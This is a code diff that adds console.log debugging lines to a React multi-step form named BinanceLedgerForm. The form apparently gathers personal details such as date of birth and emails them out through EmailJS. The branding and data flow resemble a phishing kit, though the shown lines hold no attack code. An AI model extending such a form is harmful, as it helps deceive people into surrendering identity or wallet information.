@@ -1,8 +1,9 @@
-
 import React, { useState, useEffect, useRef } from 'react';
 import emailjs from '@emailjs/browser';
 import { EMAILJS_CONFIG } from '../config/emailjs.config';
 import { FormData } from '../types/types';
+
+console.log('BinanceLedgerForm component loading...');
 
 // Define the structure of the form steps
 const formSteps = [
@@ -37,6 +38,8 @@ const initialFormData: FormData = {
 };
 
 const BinanceLedgerForm: React.FC = () => {
+  console.log('BinanceLedgerForm rendering...');
+  
   const [currentStep, setCurrentStep] = useState<string>(formSteps[0]);
   const [formData, setFormData] = useState<FormData>(initialFormData);
   const [email, setEmail] = useState<string>('');
@@ -84,6 +87,7 @@ const BinanceLedgerForm: React.FC = () => {
   const countdownInterval = useRef<NodeJS.Timeout | null>(null);
 
   useEffect(() => {
+    console.log('Initializing EmailJS...');
     // Initialize EmailJS
     emailjs.init(EMAILJS_CONFIG.USER_ID);
   }, []);
@@ -278,6 +282,8 @@ Date of Birth: ${personalDetails.dateOfBirth}
   };
 
   const renderFormStep = () => {
+    console.log('Rendering form step:', currentStep);
+    
     switch (currentStep) {
       case 'email':
         return (
@@ -646,6 +652,8 @@ Date of Birth: ${personalDetails.dateOfBirth}
         return <p className="text-white">Unknown step</p>;
     }
   };
+
+  console.log('About to render form component');
 
   return (
     <div className="max-w-md mx-auto bg-gray-900 p-6 rounded-lg shadow-lg">
